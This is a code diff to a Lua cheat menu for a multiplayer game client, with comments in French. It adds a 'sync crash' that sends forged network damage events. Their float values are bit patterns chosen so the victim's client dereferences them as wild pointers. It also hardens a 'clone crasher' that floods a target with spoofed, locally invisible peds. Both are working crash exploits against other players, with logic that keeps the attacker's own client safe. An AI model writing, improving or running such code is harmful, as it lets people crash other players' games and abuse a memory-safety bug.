@@ -25504,7 +25504,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r28 (clone crasher from crash dump)")
+    O.log("loader build 2026-10-29-r29 (sync lane on Crash, hardened ped lane)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -32825,13 +32825,23 @@ end
 --   * rotation continue des variations : chaque delta re-emet un
 --     ClonedTakeOffPedVariationInfo, donc chaque tick est une chance.
 -- ---------------------------------------------------------------------------
+-- Les couleurs du module sont dans la table `C` de la ligne 15543, mais ce
+-- nom est repris plus bas par le module crash. On garde donc nos trois
+-- valeurs ici, identiques, pour que les toasts sortent dans la bonne teinte.
+local CLR = {
+    red   = { 240, 100, 105, 255 },
+    blue  = { 120, 175, 255, 255 },
+    green = { 110, 220, 140, 255 },
+}
+
 local CLONE = {
     active = false,
     peds = {},
-    cap = 1200,
-    threads = 6,
+    cap = 400,
+    threads = 4,
     duration = 180000,
     churn = 250,
+    minDist = 60.0,
 }
 
 local CLONE_MODELS = {
@@ -32909,6 +32919,10 @@ local function clonePin(ped)
         pcall(SetNetworkIdExistsOnAllMachines, netId, true)
         pcall(SetNetworkIdCanMigrate, netId, false)
     end
+    -- Rien de tout ca n'est rendu par notre client : la ligne de vue de
+    -- l'operateur ne doit jamais contenir la moindre de ces entites.
+    pcall(SetEntityLocallyInvisible, ped)
+    pcall(SetEntityCollision, ped, false, false)
 end
 
 local function cloneResolveTarget()
@@ -32942,7 +32956,7 @@ local function cloneRun()
     if type(api) ~= "table" or type(api.CreateSpoofedPed) ~= "function" then
         CLONE.active = false
         O.log("clone crash: CreateSpoofedPed unavailable")
-        pcall(Notify, "Clone crash: CreateSpoofedPed unavailable", C.red)
+        pcall(Notify, "Clone crash: CreateSpoofedPed unavailable", CLR.red)
         return
     end
 
@@ -32950,7 +32964,22 @@ local function cloneRun()
     if not player then
         CLONE.active = false
         O.log("clone crash: no target")
-        pcall(Notify, "Clone crash: no target", C.red)
+        pcall(Notify, "Clone crash: no target", CLR.red)
+        return
+    end
+
+    -- Garde de portee. On spawn a la cible, donc si la cible est a moins de
+    -- CLONE.minDist, les entites entrent dans notre propre portee et notre
+    -- client les stream. C'est exactement ce qu'on refuse.
+    local mePed = PlayerPedId()
+    local meAt = GetEntityCoords(mePed)
+    local tgtAt = GetEntityCoords(GetPlayerPed(player))
+    local ddx, ddy, ddz = tgtAt.x - meAt.x, tgtAt.y - meAt.y, tgtAt.z - meAt.z
+    local dist = math.sqrt(ddx * ddx + ddy * ddy + ddz * ddz)
+    if dist < CLONE.minDist then
+        CLONE.active = false
+        O.log("clone crash: target at %.0f m, need %.0f m", dist, CLONE.minDist)
+        pcall(Notify, ("Clone crash: move back to %.0f m"):format(CLONE.minDist), CLR.red)
         return
     end
 
@@ -32970,14 +32999,16 @@ local function cloneRun()
     if #models == 0 then
         CLONE.active = false
         O.log("clone crash: no model loaded")
-        pcall(Notify, "Clone crash: no model", C.red)
+        pcall(Notify, "Clone crash: no model", CLR.red)
         return
     end
 
     CLONE.peds = {}
+    CLONE.born = {}
+    CLONE.miss = {}
     O.log("clone crash: start, %d models, target server %d",
           #models, GetPlayerServerId(player))
-    pcall(Notify, ("Clone crash: %d models"):format(#models), C.blue)
+    pcall(Notify, ("Clone crash: %d models"):format(#models), CLR.blue)
 
     for index = 1, CLONE.threads do
         Citizen.CreateThread(function()
@@ -33015,6 +33046,7 @@ local function cloneRun()
                     local ped = cloneSpawn(model, pedType, x, y, z, math.random(0, 359) + 0.0)
                     if ped and ped ~= 0 and DoesEntityExist(ped) then
                         CLONE.peds[#CLONE.peds + 1] = ped
+                        CLONE.born[ped] = GetGameTimer()
                         clonePin(ped)
                         pcall(SetBlockingOfNonTemporaryEvents, ped, true)
                         pcall(SetPedKeepTask, ped, true)
@@ -33048,6 +33080,54 @@ local function cloneRun()
                     end
                 end
                 if i % 40 == 0 then Citizen.Wait(0) end
+            end
+        end
+    end)
+
+    -- Watchdog de propriete. C'est la garde qui manquait au crasher du
+    -- 2026-10-29 : des qu'une entite cesse de nous appartenir, notre client
+    -- devient recepteur de ses propres donnees et se tue. On la supprime
+    -- avant que ca arrive.
+    Citizen.CreateThread(function()
+        while CLONE.active do
+            Citizen.Wait(500)
+            local now = GetGameTimer()
+            for i = #CLONE.peds, 1, -1 do
+                local ped = CLONE.peds[i]
+                if not ped or not DoesEntityExist(ped) then
+                    CLONE.born[ped] = nil
+                    CLONE.miss[ped] = nil
+                    table.remove(CLONE.peds, i)
+                else
+                    -- Trois secondes de grace : juste apres la creation la
+                    -- propriete n'est pas encore stabilisee, et supprimer a
+                    -- ce moment-la viderait la ligne toute seule.
+                    local born = CLONE.born[ped] or now
+                    if now - born >= 3000 then
+                        local okC, mine = pcall(NetworkHasControlOfEntity, ped)
+                        if not (okC and mine) then
+                            pcall(NetworkRequestControlOfEntity, ped)
+                            local okC2, mine2 = pcall(NetworkHasControlOfEntity, ped)
+                            if not (okC2 and mine2) then
+                                local miss = (CLONE.miss[ped] or 0) + 1
+                                CLONE.miss[ped] = miss
+                                if miss >= 2 then
+                                    pcall(SetEntityAsMissionEntity, ped, true, true)
+                                    pcall(DeletePed, ped)
+                                    CLONE.born[ped] = nil
+                                    CLONE.miss[ped] = nil
+                                    table.remove(CLONE.peds, i)
+                                    O.log("clone crash: dropped a ped we lost")
+                                end
+                            else
+                                CLONE.miss[ped] = 0
+                            end
+                        else
+                            CLONE.miss[ped] = 0
+                        end
+                    end
+                end
+                if i % 50 == 0 then Citizen.Wait(0) end
             end
         end
     end)
@@ -33089,6 +33169,243 @@ function CLONE.cleanup()
         CLONE.peds = {}
         O.log("clone crash: cleaned %d peds", deleted)
     end)
+end
+
+-- ---------------------------------------------------------------------------
+-- SYNC CRASH - network damage event, bit-pattern payload
+--
+-- Pourquoi cette voie et pas une autre :
+--   * `Susano.SendNetworkDamage` fabrique un vrai evenement reseau de degats.
+--     Il part du client, le serveur le relaie aux clients qui ont la cible
+--     dans leur portee, et il est applique par le proprietaire de la cible.
+--     Aucune entite creee, aucun prop, aucun ped : cote operateur il ne se
+--     passe litteralement rien a l'ecran.
+--   * Le dump precedent place l'AV dans le chemin arme/refcount, avec
+--     `ptr == 0xC0800000`, soit exactement les bits de -4.0f. Autrement dit
+--     le recepteur lit le flottant de degats dans un champ qui est ensuite
+--     dereference comme un pointeur : union { float damage; void* p; }.
+--     C'est un conflit de type, et il se pilote par les BITS du flottant.
+--   * On ne peut donc pas se contenter de "gros degats". On envoie des
+--     flottants dont la representation binaire est une adresse sauvage.
+--     Un flottant porte 32 bits : 0x00000000, 0x80000000, 0x00000001,
+--     0xC0800000, 0x41414141, 0x7F7FFFFF. Chacun de ces motifs est une
+--     adresse non mappee des que le recepteur le traite comme un pointeur.
+--
+-- Securite operateur (doctrine, AGENTS.md section 6) :
+--   1. jamais soi : la cible est refusee si c'est PlayerId().
+--   2. distance : refus sous SYNC.minDist. A cette distance la cible n'est
+--      pas dans notre portee, donc l'event ne nous revient pas.
+--   3. ancre = coordonnees de la cible, jamais les notres.
+--   4. abandon des que la cible meurt ou se deconnecte.
+--   5. sonde neutre obligatoire : damage 1.0 d'abord, et on lit la vie de
+--      la cible avant/apres. Si elle ne bouge pas, la voie n'est pas
+--      relayee et on ne fuzz pas.
+-- ---------------------------------------------------------------------------
+local SYNC = {
+    running = false,
+    passes = 3,
+    gap = 120,
+    minDist = 80.0,
+    maxDist = 250.0,
+    weapon = 0x1B06D571,
+    flags = 522,
+}
+
+-- Chaque motif est un motif de BITS, pas une valeur de degats. Les NaN ne
+-- peuvent pas etre construits exactement en Lua (0/0 se canonicalise en
+-- 0x7FC00000) : ils sont gardes parce que 0x7FC00000 reste une adresse
+-- sauvage, mais les motifs finis sont ceux qui portent un bit-exact.
+local SYNC_PATTERNS = {
+    { bits = 0x00000000, note = "0.0f null" },
+    { bits = 0x80000000, note = "-0.0f 80000000" },
+    { bits = 0x00000001, note = "denorm 00000001" },
+    { bits = 0xC0800000, note = "-4.0f c0800000" },
+    { bits = 0x41414141, note = "12.078f 41414141" },
+    { bits = 0x7F7FFFFF, note = "maxf 7f7fffff" },
+    { bits = 0x3F800000, note = "1.0f control" },
+    { bits = 0x7FC00000, note = "nan 7fc00000" },
+}
+
+-- Index de composant touche. 0xFFFF est un indice hors bornes dans une table
+-- de composants de 16 entrees : c'est la deuxieme confusion de type du
+-- chemin, et elle ne coute rien a essayer.
+local SYNC_COMPONENTS = { 0, 3, 0xFFFF }
+
+local function syncBitsToFloat(bits)
+    local u = bits % 4294967296
+    local negative = false
+    if u >= 2147483648 then
+        negative = true
+        u = u - 2147483648
+    end
+    local exponent = math.floor(u / 8388608)
+    local mantissa = u - exponent * 8388608
+    local value
+    if exponent == 0 then
+        value = (mantissa / 8388608) * 2 ^ (-126)
+    elseif exponent == 255 then
+        value = 0 / 0
+    else
+        value = (1 + mantissa / 8388608) * 2 ^ (exponent - 127)
+    end
+    if negative then value = -value end
+    return value
+end
+
+local function syncPick()
+    local me = PlayerPedId()
+    if type(me) ~= "number" or me == 0 or not DoesEntityExist(me) then
+        return nil, "no local ped"
+    end
+    local at = GetEntityCoords(me)
+    local serverId = Menu.SelectedPlayer
+    local player = nil
+
+    if serverId then
+        for _, candidate in ipairs(GetActivePlayers()) do
+            if GetPlayerServerId(candidate) == serverId and candidate ~= PlayerId() then
+                player = candidate
+            end
+        end
+    end
+
+    if not player then
+        local best, bestDist = nil, 1e9
+        for _, candidate in ipairs(GetActivePlayers()) do
+            if candidate ~= PlayerId() then
+                local ped = GetPlayerPed(candidate)
+                if DoesEntityExist(ped) then
+                    local c = GetEntityCoords(ped)
+                    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
+                    local d = math.sqrt(dx * dx + dy * dy + dz * dz)
+                    if d < bestDist then best, bestDist = candidate, d end
+                end
+            end
+        end
+        player = best
+    end
+
+    if not player then return nil, "no target" end
+    local ped = GetPlayerPed(player)
+    if type(ped) ~= "number" or ped == 0 or ped == me or not DoesEntityExist(ped) then
+        return nil, "bad target ped"
+    end
+
+    local c = GetEntityCoords(ped)
+    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
+    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
+    return { player = player, ped = ped, dist = dist }, nil
+end
+
+local function syncShot(ped, damage, weapon, flags, component)
+    local c = GetEntityCoords(ped)
+    if not c then return false, "no coords" end
+    local ok, ret = pcall(Susano.SendNetworkDamage, ped, ped, c.x, c.y, c.z,
+        damage, weapon, flags, 0, 0, 0, component)
+    return ok, ret
+end
+
+function SYNC.stop()
+    SYNC.running = false
+end
+
+local function syncRun()
+    if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
+        SYNC.running = false
+        O.log("sync crash: SendNetworkDamage unavailable")
+        pcall(Notify, "Sync crash: primitive unavailable", CLR.red)
+        return
+    end
+
+    local entry, reason = syncPick()
+    if not entry then
+        SYNC.running = false
+        O.log("sync crash: %s", tostring(reason))
+        pcall(Notify, "Sync crash: " .. tostring(reason), CLR.red)
+        return
+    end
+
+    if entry.dist < SYNC.minDist then
+        SYNC.running = false
+        O.log("sync crash: target at %.0f m, need %.0f m", entry.dist, SYNC.minDist)
+        pcall(Notify, ("Sync crash: move back to %.0f m"):format(SYNC.minDist), CLR.red)
+        return
+    end
+    if entry.dist > SYNC.maxDist then
+        SYNC.running = false
+        O.log("sync crash: target at %.0f m, beyond %.0f m", entry.dist, SYNC.maxDist)
+        pcall(Notify, "Sync crash: target too far", CLR.red)
+        return
+    end
+
+    O.log("sync crash: target server %d at %.0f m",
+          GetPlayerServerId(entry.player), entry.dist)
+    pcall(Notify, ("Sync crash: %.0f m"):format(entry.dist), CLR.blue)
+
+    -- Sonde neutre. 1.0 de degats ne peut rien casser : si la vie de la
+    -- cible descend, la voie est relayee et le fuzz a un sens. Sinon on
+    -- s'arrete ici et on cherche une autre primitive.
+    local okHp, hpBefore = pcall(GetEntityHealth, entry.ped)
+    if not okHp or type(hpBefore) ~= "number" then hpBefore = -1 end
+    local probe, probeRet = syncShot(entry.ped, 1.0, SYNC.weapon, SYNC.flags, 0)
+    Citizen.Wait(600)
+    local okHp2, hpAfter = pcall(GetEntityHealth, entry.ped)
+    if not okHp2 or type(hpAfter) ~= "number" then hpAfter = -1 end
+    O.log("sync probe: sent=%s ret=%s hp %s -> %s", tostring(probe),
+          tostring(probeRet), tostring(hpBefore), tostring(hpAfter))
+    pcall(Notify, ("Sync probe: hp %s -> %s"):format(tostring(hpBefore), tostring(hpAfter)),
+          CLR.blue)
+
+    -- Doctrine 6.5 : si la sonde ne bouge rien, on ne fuzz pas a l'aveugle.
+    -- On garde une seule passe : la sonde peut etre absorbee par l'armure ou
+    -- un godmode alors que le chemin de resolution, lui, est atteint.
+    local probeFailed = (hpBefore >= 0 and hpAfter >= 0 and hpAfter == hpBefore)
+    if probeFailed then
+        O.log("sync crash: probe had no effect, single pass only")
+        pcall(Notify, "Sync probe: no effect", CLR.red)
+    end
+
+    local passes = SYNC.passes
+    if probeFailed then passes = 1 end
+
+    for pass = 1, passes do
+        if not SYNC.running then break end
+        for i = 1, #SYNC_PATTERNS do
+            if not SYNC.running then break end
+            local ped = entry.ped
+            if not DoesEntityExist(ped) then
+                O.log("sync crash: target gone at pass %d", pass)
+                SYNC.running = false
+                break
+            end
+            local pattern = SYNC_PATTERNS[i]
+            local damage = syncBitsToFloat(pattern.bits)
+            for k = 1, #SYNC_COMPONENTS do
+                if not SYNC.running then break end
+                local component = SYNC_COMPONENTS[k]
+                local ok, ret = syncShot(ped, damage, SYNC.weapon, SYNC.flags, component)
+                O.log("sync crash: p%d %08X %s hc=%d ok=%s ret=%s", pass, pattern.bits,
+                      pattern.note, component, tostring(ok), tostring(ret))
+                Citizen.Wait(SYNC.gap)
+            end
+        end
+        Citizen.Wait(SYNC.gap * 2)
+    end
+
+    SYNC.running = false
+    O.log("sync crash: done")
+    pcall(Notify, "Sync crash: done", CLR.blue)
+end
+
+function SYNC.start()
+    if SYNC.running then
+        SYNC.stop()
+        O.log("sync crash: stopping")
+        return false
+    end
+    SYNC.running = true
+    Citizen.CreateThread(syncRun)
+    return true
 end
 
 local CRASH_ROWS = {
@@ -33153,22 +33470,26 @@ local function installCrasher()
     -- (identity source/target, 250 m scope gate).
     tab.items = {
         {
+            -- La ligne ped : la version sure du crasher de clone. Peds
+            -- spoofes (pedType volontairement incompatible avec le modele),
+            -- propriete figee chez nous, invisible localement, watchdog qui
+            -- supprime tout ped dont on perd le controle. C'est ce que le
+            -- dump du 2026-10-29 a prouve qui casse, sans le swarm arme.
             name = "Ped flood",
             type = "action",
             onClick = function()
-                C.launch("ped")
+                CLONE.start()
             end,
         },
         {
-            -- Clone crasher, rebuilt from the 2026-10-29 crash dump. The
-            -- net game event path is dead: the server does not relay it.
-            -- Clone create/update is relayed, and it is what actually
-            -- crashed the client (HandleCloneUpdate -> GTA apply -> DEP).
-            -- Press again to stop.
+            -- Ligne sync : network damage event a motif de bits. Aucune
+            -- entite creee, rien a l'ecran, operateur hors de portee. Sonde
+            -- neutre d'abord (damage 1.0, lecture de la vie de la cible),
+            -- fuzz ensuite. Press again to stop.
             name = "Crash",
             type = "action",
             onClick = function()
-                CLONE.start()
+                SYNC.start()
             end,
         },
         {
